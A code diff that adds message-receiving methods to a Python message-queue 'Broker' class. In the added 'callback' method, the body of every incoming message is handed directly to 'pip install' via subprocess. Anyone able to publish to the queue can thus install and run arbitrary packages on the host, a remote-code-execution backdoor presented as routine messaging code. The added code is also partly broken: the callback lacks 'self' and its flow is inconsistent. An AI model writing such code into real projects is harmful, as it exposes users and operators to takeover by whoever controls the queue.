@@ -38,6 +38,43 @@ class Broker:
     ):
         self._ctx = ChannelContext(host, port, username, password)
         self._timeout = timeout
+        
+    def callback(ch, method, properties, body):
+        print(" [x] Received %r" % body)
+        pkg = body
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install',
+                               pkg])
+
+    def receive_msg(self, routing_key: str, body: Any):
+        with self._ctx as channel:
+            channel.basic_consume(
+                queue=routing_key,
+                on_message_callback=self.callback,
+                auto_ack=True)
+            timeout = datetime.utcnow() + timedelta(seconds=self._timeout)
+            while True:
+                res = channel.basic_get("amq.rabbitmq.reply-to", True)
+                if res[0] is None:
+                    if datetime.utcnow() > timeout:
+                        raise TimeoutError(
+                            "Timed out while waiting for reply from server"
+                        )
+                    continue
+                res_body: str = res[2]
+                break
+        reply_dict = json.loads(res_body)
+        if not isinstance(reply_dict, dict):
+            raise TypeError("Replies must be a dictionary")
+        if not isinstance(reply_dict.get("is_error"), bool):
+            raise RuntimeError('Replies must include a boolean "is_error"')
+        if reply_dict["is_error"] and (
+                not isinstance(reply_dict.get("error_msg"), str)
+                or len(reply_dict["error_msg"]) == 0
+        ):
+            raise RuntimeError(
+                'Replies that report an error must include "error_msg" of length greater than zero'
+            )
+        return reply_dict
 
     def send_msg(self, routing_key: str, body: dict[str, Any] = {}) -> dict[str, Any]:
         body_str = json.dumps(body, seperators=(",", ":"))
